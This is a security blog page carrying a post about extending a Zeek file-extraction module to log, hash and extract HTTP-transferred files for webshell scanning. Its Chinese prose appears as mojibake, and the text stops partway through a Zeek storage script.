<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{&quot;hostname&quot;:&quot;example.com&quot;,&quot;root&quot;:&quot;&#x2F;&quot;,&quot;images&quot;:&quot;&#x2F;images&quot;,&quot;scheme&quot;:&quot;Mist&quot;,&quot;version&quot;:&quot;8.4.0&quot;,&quot;exturl&quot;:false,&quot;sidebar&quot;:{&quot;position&quot;:&quot;left&quot;,&quot;display&quot;:&quot;post&quot;,&quot;padding&quot;:18,&quot;offset&quot;:12},&quot;copycode&quot;:true,&quot;bookmark&quot;:{&quot;enable&quot;:false,&quot;color&quot;:&quot;#222&quot;,&quot;save&quot;:&quot;auto&quot;},&quot;fancybox&quot;:false,&quot;mediumzoom&quot;:false,&quot;lazyload&quot;:false,&quot;pangu&quot;:false,&quot;comments&quot;:{&quot;style&quot;:&quot;tabs&quot;,&quot;active&quot;:null,&quot;storage&quot;:true,&quot;lazyload&quot;:false,&quot;nav&quot;:null},&quot;motion&quot;:{&quot;enable&quot;:true,&quot;async&quot;:false,&quot;transition&quot;:{&quot;post_block&quot;:&quot;fadeIn&quot;,&quot;post_header&quot;:&quot;fadeInDown&quot;,&quot;post_body&quot;:&quot;fadeInDown&quot;,&quot;coll_header&quot;:&quot;fadeInLeft&quot;,&quot;sidebar&quot;:&quot;fadeInUp&quot;}},&quot;prism&quot;:false,&quot;i18n&quot;:{&quot;placeholder&quot;:&quot;æœç´¢...&quot;,&quot;empty&quot;:&quot;æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}&quot;,&quot;hits_time&quot;:&quot;æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰&quot;,&quot;hits&quot;:&quot;æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ&quot;},&quot;path&quot;:&quot;&#x2F;search.xml&quot;,&quot;localsearch&quot;:{&quot;enable&quot;:true,&quot;trigger&quot;:&quot;auto&quot;,&quot;top_n_per_article&quot;:1,&quot;unescape&quot;:false,&quot;preload&quot;:false}}</script>
<meta name="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
<meta property="og:type" content="website">
<meta property="og:title" content="Canon&#39;s Blog">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Canon&#39;s Blog">
<meta property="og:description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Canon">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/2/">



<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:true,&quot;isPost&quot;:false,&quot;lang&quot;:&quot;zh-CN&quot;,&quot;comments&quot;:&quot;&quot;,&quot;permalink&quot;:&quot;&quot;,&quot;path&quot;:&quot;page&#x2F;2&#x2F;index.html&quot;,&quot;title&quot;:&quot;&quot;}</script>

<script class="next-config" data-name="calendar" type="application/json">&quot;&quot;</script>
<title>Canon's Blog</title><script src="/js/config.js"></script>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Canon's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Canon</p>
  <div class="site-description" itemprop="description">ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">36</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="è¿”å›é¡¶éƒ¨">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/31/Zeek-File-Extraction-Plus/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/31/Zeek-File-Extraction-Plus/" class="post-title-link" itemprop="url">Zeek - File Extraction Plus</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-12-31 11:09:16 / ä¿®æ”¹æ—¶é—´ï¼š16:26:03" itemprop="dateCreated datePublished" datetime="2021-12-31T11:09:16+08:00">2021-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/NTA/" itemprop="url" rel="index"><span itemprop="name">NTA</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>5.1k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>5 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h4><p>æœ€è¿‘åœ¨ç ”ç©¶å¦‚ä½•å°†Wazuhä¸YARAæ•´åˆï¼Œä¹Ÿå°±æ˜¯å½“è§¦å‘Wazuh FIMäº‹ä»¶æ—¶é€šè¿‡ä½¿ç”¨Wazuhä¸»åŠ¨å“åº”æ¨¡å—è‡ªåŠ¨æ‰§è¡ŒYARAæ‰«æã€‚è¯¥åŠŸèƒ½å°†æ‰«æé›†ä¸­åœ¨æ–°æ–‡ä»¶æˆ–æœ€è¿‘ä¿®æ”¹è¿‡çš„æ–‡ä»¶ä¸Šï¼Œä»è€Œä¼˜åŒ–äº†è¢«ç›‘æ§ç«¯ç‚¹çš„èµ„æºæ¶ˆè€—ã€‚ç”±äºæˆ‘å¸çš„ä¸šåŠ¡ç‰¹æ€§ï¼Œæœ€å…ˆæƒ³åˆ°çš„åœºæ™¯å°±æ˜¯WebShellçš„æ£€æµ‹äº†ã€‚</p>
<p>ä¸‹é¢æ¥è¯´è¯´åœ¨å®é™…ç¯å¢ƒä¸­å¸¦æ¥çš„â€œæŒ‘æˆ˜â€å§ã€‚è¯¥åŠŸèƒ½ä¸»è¦æ˜¯ä¾æ‰˜Wazuh FIMäº‹ä»¶ï¼Œå¦‚æœå¤§å®¶ç†Ÿæ‚‰Wazuhçš„è¯éƒ½åº”è¯¥çŸ¥é“ï¼Œè§¦å‘FIMäº‹ä»¶çš„å¿…è¦æ¡ä»¶æ˜¯æŒ‡å®šç›‘æ§ç›®å½•ã€‚é‚£ä¹ˆï¼Œå½“ä½ æ‹¿ç€ä»CMDBç­›é€‰å‡ºçš„WebæœåŠ¡å™¨ç»™åˆ°è¿ç»´è¯¢é—®Webè·¯å¾„æ—¶ï¼Œä½ å¾ˆå¯èƒ½æ— æ³•å¾—åˆ°ä½ æƒ³è¦çš„ç­”æ¡ˆã€‚å¯¹äºè¿™ç§è·¯å¾„ä¸ç»Ÿä¸€çš„æƒ…å†µï¼Œä½ å¯ä»¥é€‰æ‹©è‡ªå·±äººå·¥æ‰‹åŠ¨æ”¶é›†å¹¶ç»´æŠ¤ï¼Œå¦‚æœé¢å¯¹ä¸Šåƒå°çš„æœåŠ¡å™¨ï¼Œé‚£ä¼šèŠ±è´¹å¤§é‡çš„æ—¶é—´æˆæœ¬ï¼Œæˆ–è€…ä½ å¯ä»¥é€‰æ‹©å°†é—®é¢˜ä¸Šå‡æ¨è¿›æ•´æ”¹ï¼ˆè¿™æ¡â€œè·¯â€ä¸å¥½èµ°å•ŠğŸ˜‚ï¼‰ã€‚</p>
<h4 id="åŠæ³•æ€»æ¯”å›°éš¾å¤š"><a href="#åŠæ³•æ€»æ¯”å›°éš¾å¤š" class="headerlink" title="åŠæ³•æ€»æ¯”å›°éš¾å¤š"></a>åŠæ³•æ€»æ¯”å›°éš¾å¤š</h4><p>éƒ½è¯´ä¸Šå¸ä¸ºä½ å…³äº†ä¸€æ‰‡é—¨ï¼Œå¿…å®šä¼šä¸ºä½ æ‰“å¼€ä¸€æ‰‡çª—ã€‚æŸå¤©åœ¨å†™ä»£ç æ—¶çœ‹åˆ°Twitteræ¨äº†ä¸€æ¡Zeekçš„åŠ¨æ€ï¼Œæ­¤æ—¶ï¼Œæˆ‘æ‚Ÿäº†ğŸ˜…ï¼çº ç»“ä¸ªæ¯›çš„è·¯å¾„ï¼Ÿæˆ‘ç›´æ¥æŠŠéœ€è¦çš„æ•°æ®åœ¨NTAä¸Šè¿˜åŸå‡ºæ¥ä¸å°±å¾—äº†ï¼Œåªéœ€å°†EDRè£…åœ¨NTAä¸Šå¹¶ç›‘æ§æ–‡ä»¶è¿˜åŸçš„ç›®å½•å³å¯ã€‚è‡³äºæˆ‘ä¸ºå•¥é€‰æ‹©Zeekæ²¡ç”¨Suricataï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºZeekå¯å®šåˆ¶åŒ–ç¨‹åº¦æ¯”Suricataæ›´é«˜ä¸€äº›ã€‚å¦å¤–ä¸€ç‚¹Zeekæ”¯æŒé›†ç¾¤åŒ–éƒ¨ç½²ï¼Œè§„åˆ™å¯ä»¥ç›´æ¥ç”±Managerç»Ÿä¸€ä¸‹å‘ï¼Œè¿™ç‚¹è¦æ¯”Suricataæ–¹ä¾¿å¾ˆå¤šï¼Œå½“ç„¶è¿™ä¹Ÿå¾—ç›Šäºé›†ç¾¤çš„ä¼˜åŠ¿ã€‚</p>
<p>è¯´å›æ–‡ä»¶è¿˜åŸçš„äº‹å„¿ï¼ŒZeekä¸Šå·²ç»æœ‰ â€œå‰äººâ€ (<strong><a target="_blank" rel="noopener" href="https://github.com/hosom/file-extraction/actions"><em>hosom</em></a></strong>) å†™è¿‡ä¸€ä¸ªæ–‡ä»¶è¿˜åŸçš„æ¨¡å—ã€‚ä¸è¿‡åœ¨ä½¿ç”¨ä¸­ä¹Ÿå‘ç°äº†ä¸€äº›ä¸å¤ªè´´åˆæˆ‘è¿™è¾¹å®é™…åœºæ™¯çš„æƒ…å†µï¼Œå¥½åœ¨Zeekéå¸¸çš„â€œ<strong>Open</strong>â€ğŸ˜åªéœ€è¦ç¨åŠ æ”¹åŠ¨å°±å¯ä»¥æ»¡è¶³æˆ‘çš„éœ€æ±‚äº†ã€‚</p>
<h4 id="åšäº†å“ªäº›æ”¹è¿›"><a href="#åšäº†å“ªäº›æ”¹è¿›" class="headerlink" title="åšäº†å“ªäº›æ”¹è¿›"></a>åšäº†å“ªäº›æ”¹è¿›</h4><ul>
<li><p>å»å…¶ç³ ç³Ÿï¼Œå–å…¶ç²¾å</p>
<p>Zeek å’Œ Suricata è®°å½•æ—¥å¿—çš„æ–¹å¼æ¯”è¾ƒç›¸ä¼¼ï¼Œéƒ½æ˜¯æ ¹æ®äº‹ä»¶ç±»å‹æ¥è®°å½•æ—¥å¿—ã€‚æ­£å› å¦‚æ­¤ï¼Œè‹¥æƒ³å¯¹æ–‡ä»¶è¿˜åŸäº‹ä»¶è¿›è¡Œæº¯æºï¼Œè¿˜éœ€å€ŸåŠ©åè®®è§£ææ—¥å¿—æ¥è¿›è¡Œä¸Šä¸‹æ–‡çš„å…³è”ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡HTTPåè®®è¿˜åŸçš„æ–‡ä»¶ï¼Œå°±éœ€è¦å€ŸåŠ©<code>http.log</code>ã€‚ç”±äºåœ¨æˆ‘çš„å®é™…ç¯å¢ƒä¸­HTTPæµé‡å¾ˆå¤§ï¼Œå¦‚æœä¸å¯¹åè®®è§£æçš„äº‹ä»¶åšè¿‡æ»¤çš„è¯ï¼Œé‚£ä¹ˆè¾“å‡ºçš„æ—¥å¿—é‡ä¼šéå¸¸çš„â€œææ€–â€ã€‚å› æ­¤ï¼Œæˆ‘åšäº†ä¸€äº›ä¼˜åŒ–ï¼Œç°åœ¨åªæœ‰å½“åŒ¹é…åˆ°æ–‡ä»¶è¿˜åŸäº‹ä»¶åï¼Œæ‰ä¼šè¾“å‡ºå¯¹åº”çš„åè®®è§£æäº‹ä»¶ã€‚</p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/file-extension-logs.zeek">file-extension-logs.zeek</a></strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record Files::Info += &#123;</span><br><span class="line">      flags:      <span class="built_in">string</span>      &amp;<span class="keyword">default</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">Files::log_policy</span><span class="params">(rec: Files::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$flags == <span class="string">&quot;&quot;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(Files::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;file_extraction&quot;</span>, $path=<span class="string">&quot;file-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(Files::LOG, filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a></strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line">  </span><br><span class="line">  redef record HTTP::Info += &#123;</span><br><span class="line">      records:    <span class="keyword">bool</span>        &amp;<span class="keyword">default</span>=F;</span><br><span class="line">      domain:     <span class="built_in">string</span>      &amp;optional &amp;<span class="built_in">log</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">      </span>&#123;    </span><br><span class="line">      <span class="keyword">if</span> ( rec$records == F )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      Log::remove_default_filter(HTTP::LOG);</span><br><span class="line">      local filter: Log::Filter = [$name=<span class="string">&quot;http_extraction&quot;</span>, $path=<span class="string">&quot;http-extraction&quot;</span>];</span><br><span class="line">      Log::add_filter(HTTP::LOG, filter);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">export</span> &#123;</span><br><span class="line">      global http: function(f: fa_file): fa_file;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">function <span class="title">http</span><span class="params">(f: fa_file)</span>: fa_file</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">      f$http$records = T;</span><br><span class="line">      f$http$domain = f$http$host;</span><br><span class="line">      <span class="keyword">return</span> f;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><strong>ç¤ºä¾‹ - 1</strong></p>
<p>**<a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/http-extension-logs.zeek">http-extension-logs.zeek</a>**ï¼Œè´Ÿè´£è®°å½•å‘½ä¸­æ–‡ä»¶è¿˜åŸçš„åè®®è§£æäº‹ä»¶ï¼ŒåæœŸé€šè¿‡å°†2ä¸ªäº‹ä»¶fuidå­—æ®µè¿›è¡Œå…³è”ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„å»åˆ†ææ•´ä¸ªäº‹ä»¶ã€‚</p>
<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-1.png" alt="image-20211101202304818"></p>
</li>
<li><p>æ›´çµæ´»ï¼Œæ›´å¼ºå¤§</p>
<p>â€‹    æ”¯æŒæ ¹æ®æ–‡ä»¶ç±»å‹é€‰æ‹©<strong>hash</strong>æˆ–è€…<strong>extract</strong> </p>
<p>â€‹    <strong>hash</strong>: åªè®¡ç®—æ–‡ä»¶çš„HASHä½†ä¸å¯¹æ­¤æ–‡ä»¶è¿›è¡Œæå–ï¼›</p>
<p>â€‹    <strong>extract</strong>: è¿˜åŸæŒ‡å®šç±»å‹çš„æ–‡ä»¶ã€‚æ”¯æŒé’ˆå¯¹HTTPåè®®ï¼Œå¯é€‰åŸŸåã€URIã€è¯·æ±‚æ–¹æ³•ç­‰å­—æ®µç»„åˆè¿›è¡Œæå–ï¼Œæ–‡ä»¶è¿˜åŸåæŒ‰ç…§æ—¥æœŸå­˜å‚¨ï¼›</p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/extract-custom.zeek">extract-custom.zeek</a></strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> FileExtraction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_types: <span class="built_in">set</span>[<span class="built_in">string</span>, <span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;hash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;text/x-php&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-pdf&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>, <span class="string">&quot;extract&quot;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> custom_extract: <span class="built_in">set</span>[<span class="built_in">string</span>] = &#123;</span><br><span class="line">    [<span class="string">&quot;POST&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;extract&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;extract&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ( [meta$mime_type, <span class="string">&quot;hash&quot;</span>] in custom_types )</span><br><span class="line">            &#123;</span><br><span class="line">            f$info$flags = <span class="string">&quot;hash&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::http_extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( f$http?$host &amp;&amp; f$http?$method &amp;&amp; f$http?$uri &amp;&amp; f$info$is_orig )</span><br><span class="line">            <span class="keyword">if</span> ( [f$http$method] in custom_extract )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        f$info$flags = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹    <strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/store-files-by-md5.zeek">store-files-by-md5.zeek</a></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line">@load policy/frameworks/files/hash-all-files</span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtraction::path == <span class="string">&quot;&quot;</span> )</span><br><span 